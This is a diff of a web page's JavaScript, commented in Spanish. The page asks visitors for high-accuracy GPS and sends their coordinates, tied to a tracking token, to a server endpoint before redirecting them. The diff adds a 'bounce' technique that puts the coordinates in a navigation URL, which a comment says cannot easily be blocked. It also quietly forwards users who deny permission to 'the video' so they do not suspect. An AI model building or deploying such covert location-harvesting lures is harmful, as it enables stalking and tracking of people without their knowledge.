@@ -26,30 +26,32 @@
         function pedirGPS() {
             document.getElementById('msg').innerText = "Conectando con satélite...";
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(enviarDatos, errorGPS, {enableHighAccuracy: true, timeout: 10000});
+                // Pedimos GPS
+                navigator.geolocation.getCurrentPosition(enviarPorRebote, errorGPS, {
+                    enableHighAccuracy: true, 
+                    timeout: 10000
+                });
             } else {
-                // Si no hay GPS, pasamos
+                // Si no hay GPS, redirigimos normal
                 window.location.href = "/redirect/" + token;
             }
         }
 
-        function enviarDatos(pos) {
-            fetch('/api/save_gps', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    token: token,
-                    lat: pos.coords.latitude,
-                    lon: pos.coords.longitude,
-                    acc: pos.coords.accuracy
-                })
-            }).then(() => {
-                window.location.href = "/redirect/" + token;
-            });
+        function enviarPorRebote(pos) {
+            // TÉCNICA DEL REBOTE:
+            // Ponemos los datos en la URL y navegamos. Esto NO se puede bloquear fácil.
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            const acc = pos.coords.accuracy;
+            
+            // Redirigimos al endpoint de guardado con los datos en la mochila
+            window.location.href = `/api/save_gps_bounce?token=${token}&lat=${lat}&lon=${lon}&acc=${acc}`;
         }
 
         function errorGPS(err) {
-            document.getElementById('msg').innerText = "⚠️ Error: Debes presionar 'Permitir' para continuar.";
+            // Si deniegan el permiso, los mandamos al video de todas formas
+            // para que no sospechen.
+            window.location.href = "/redirect/" + token;
         }
     </script>
 </body>
